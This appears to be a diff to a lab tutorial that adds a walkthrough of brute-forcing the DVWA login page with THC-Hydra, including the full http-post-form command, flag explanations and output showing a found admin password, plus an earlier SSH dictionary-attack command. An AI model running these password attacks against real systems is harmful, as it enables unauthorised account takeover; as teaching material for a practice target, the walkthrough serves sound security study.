@@ -294,7 +294,59 @@ In this case, we are going to launch a dictionary attack against the SSH service
 
     hydra -v -V -L users.txt -P passwords.txt 192.168.8.142 ssh
 
-Did it worked? Why? Try to understand what happened.
+Note: this will only work if the SSH service accepts password-based authentication.
 
 ### Attacking Web application with THC-Hydra
+
+In order to do this, we will use a vulnerable web application called [DVWA](https://github.com/digininja/DVWA). You'll find more information about how to install [DVWA](../appsecurity/dvwa.md) in this section.
+
+For this sake, we'll assume that you already have DVWA installed and that it can be used.
+
+First, lets navigate login page of the application and we will try to use a dictionary attack to crack the authentication web page of the application.
+
+    http://192.168.8.142/dvwa/login.php
+
+In order to find how to conduct the attack, we need to inspect the web page to understand how we could use THC-Hydra to launch the attack.
+
+After looking at the page we learn that is necessary to send the following parameters, through the POST method:
+
+`username`: this is the name of the user
+
+`password`: this is the password of the user
+
+`Login`: a variable that always contains the value "Login"
+
+We also need to understand what fails in the case of a bad authentication. In this case we notice that the application presents the message "**Login Failed**". This is important for THC-Hydra to distinguish a successful from unsuccessful login attempts.
+
+So in order to conduct this attack, we need to do:
+
+    hydra -L users.txt -P passwords.txt -I -e ns -F -u -t 1 -w 10 -v -V 192.168.8.142 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+
+Some of the parameters are already known, but lets look at some others:
+
+`-I`: ignore an existing restore file
+
+`-e ns`: try "n" null password, "s" login as pass and/or "r" reversed login
+
+`-F`: exit when a login/pass pair is found
+
+`-u`: loop around users, not passwords
+
+`-t 1`: run TASKS number of connects in parallel per target
+
+`-w 10`: wait time for a response
+
+After this we should look at the output of the THC-Hydra tool:
+
+    ...
+    [ATTEMPT] target 192.168.8.142 - login "azureuser" - pass "qwerty" - 90 of 252 [child 0] (0/0)
+    [VERBOSE] Page redirected to http[s]://192.168.8.142:80/dvwa/login.php
+    [ATTEMPT] target 192.168.8.142 - login "root" - pass "password" - 91 of 252 [child 0] (0/0)
+    [VERBOSE] Page redirected to http[s]://192.168.8.142:80/dvwa/login.php
+    [ATTEMPT] target 192.168.8.142 - login "admin" - pass "password" - 92 of 252 [child 0] (0/0)
+    [VERBOSE] Page redirected to http[s]://192.168.8.142:80/dvwa/index.php
+    [80][http-post-form] host: 192.168.8.142   login: admin   password: password
+    [STATUS] attack finished for 192.168.8.142 (valid pair found)
+    1 of 1 target successfully completed, 1 valid password found
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-07 01:28:28
 
